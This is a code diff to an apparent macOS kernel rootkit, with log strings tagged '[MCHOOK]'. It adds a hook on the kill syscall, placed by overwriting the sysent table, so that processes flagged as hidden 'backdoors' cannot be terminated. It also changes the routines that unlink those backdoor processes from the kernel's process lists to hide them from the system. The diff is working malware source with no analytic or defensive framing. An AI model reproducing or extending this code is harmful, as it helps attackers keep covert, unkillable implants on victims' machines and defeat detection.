@@ -189,7 +189,7 @@ static int cdev_ioctl(dev_t dev,
           return error;
         }
         
-        if (g_reg_backdoors[backdoor_index]->isHidden == 1) {
+        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
 #ifdef DEBUG
           printf("[MCHOOK] ERR: Backdoor is already hidden\n");
 #endif
@@ -250,7 +250,7 @@ static int cdev_ioctl(dev_t dev,
         }
           
         if (g_backdoor_current != -1
-            && g_reg_backdoors[g_backdoor_current]->isHidden == 1) {
+            && g_reg_backdoors[g_backdoor_current]->isProcHidden == 1) {
 #ifdef DEBUG
           printf("[MCHOOK] Re-linking process %d\n", p->p_pid);
 #endif
@@ -258,7 +258,6 @@ static int cdev_ioctl(dev_t dev,
           unhide_proc(p);
         }
 #endif
-        
         int backdoor_index;
         
         if ((backdoor_index = get_backdoor_index(p, username)) == -1) {
@@ -269,15 +268,12 @@ static int cdev_ioctl(dev_t dev,
           return error;
         }
         
-        if (g_reg_backdoors[backdoor_index]->isHidden == 0) {
+        if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
 #ifdef DEBUG
-          printf("[MCHOOK] ERR: Backdoor is not hidden\n");
+          printf("[MCHOOK] Backdoor is hidden, unhiding\n");
 #endif
-          return error;
+          unhide_proc(p, backdoor_index);
         }
-        
-        
-        unhide_proc(p, backdoor_index);
         
         //g_backdoor_current = -1;
         dealloc_meh(username, p->p_pid);
@@ -740,6 +736,23 @@ int hook_getdirentriesattr(struct proc *p,
   return success;
 }
 
+int hook_kill(struct proc *p,
+              struct mk_kill_args *uap,
+              int *retval)
+{
+	int i = 0;
+  
+  for (; i < g_backdoor_counter_static; i++) {
+    if (g_reg_backdoors[i]->isActive        == 1
+        && g_reg_backdoors[i]->isProcHidden == 1
+        && g_reg_backdoors[i]->p->p_pid     == uap->pid) {
+      return 0;
+    }
+  }
+  
+  return real_kill(p, uap, retval);
+}
+  
 #if 0
 int hook_read(struct proc *p,
               struct mk_read_args *uap,
@@ -760,7 +773,7 @@ int hook_read(struct proc *p,
   return (error);
 }
 #endif
-
+/*
 int hook_shutdown(struct proc *p,
                   struct mk_shutdown_args *uap,
                   int *retval)
@@ -786,7 +799,7 @@ int hook_reboot(struct proc *p,
   
   return -1;//real_reboot(p, uap, retval);
 }
-
+*/
 #pragma mark -
 #pragma mark General purpose functions
 #pragma mark -
@@ -946,6 +959,12 @@ void place_hooks()
     _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)hook_getdirentriesattr;
     fl_getdirentriesattr = 1;
   }
+  
+  if (fl_kill == 0) {
+    real_kill = (kill_func_t *)_sysent[SYS_kill].sy_call;
+    _sysent[SYS_kill].sy_call = (sy_call_t *)hook_kill;
+    fl_kill = 1;
+  }
   /*
   if (fl_shutdown == 0) {
     real_shutdown = (shutdown_func_t *)_sysent[SYS_shutdown].sy_call;
@@ -982,6 +1001,11 @@ void remove_hooks()
   if (fl_getdirentriesattr) {
     _sysent[SYS_getdirentriesattr].sy_call = (sy_call_t *)real_getdirentriesattr;
     fl_getdirentriesattr = 0;
+  }
+  
+  if (fl_kill) {
+    _sysent[SYS_kill].sy_call = (sy_call_t *)real_kill;
+    fl_kill = 0;
   }
   /*
   if (fl_shutdown) {
@@ -1303,19 +1327,18 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
   // Unlinking proc
   //
   LIST_FOREACH(proc, i_allproc, p_list) {
-    i_proc_lock(proc);
-    
     if (proc->p_pid == p->p_pid) {
 #ifdef DEBUG
       printf("[MCHOOK] pid %d found\n", p->p_pid);
 #endif
       
+      i_proc_lock(proc);
+      
       LIST_REMOVE(proc, p_list);
-      // XXX: Check this
       LIST_REMOVE(proc, p_hash);
       
       i_proc_unlock(proc);
-      (*i_nprocs)--;
+      //(*i_nprocs)--;
       
 #ifdef DEBUG
       printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
@@ -1325,7 +1348,7 @@ int hide_proc(proc_t p, char *username, int backdoor_index)
       break;
     }
     
-    i_proc_unlock(proc);
+    //i_proc_unlock(proc);
   }
   
   i_proc_list_unlock();
@@ -1388,7 +1411,7 @@ int unhide_proc(proc_t p, int backdoor_index)
   if (g_reg_backdoors[backdoor_index]->isProcHidden == 1) {
     i_proc_list_lock();
     LIST_INSERT_HEAD(i_allproc, p, p_list);
-    (*i_nprocs)++;
+    //(*i_nprocs)++;
     i_proc_list_unlock();
     
     g_reg_backdoors[backdoor_index]->isProcHidden = 0;
@@ -1399,7 +1422,7 @@ int unhide_proc(proc_t p, int backdoor_index)
 #endif
   }
   
-  g_reg_backdoors[backdoor_index]->isHidden     = 0;
+  g_reg_backdoors[backdoor_index]->isHidden       = 0;
   
 #ifdef DEBUG
   printf("[MCHOOK] Procs count: %d\n", *i_nprocs);
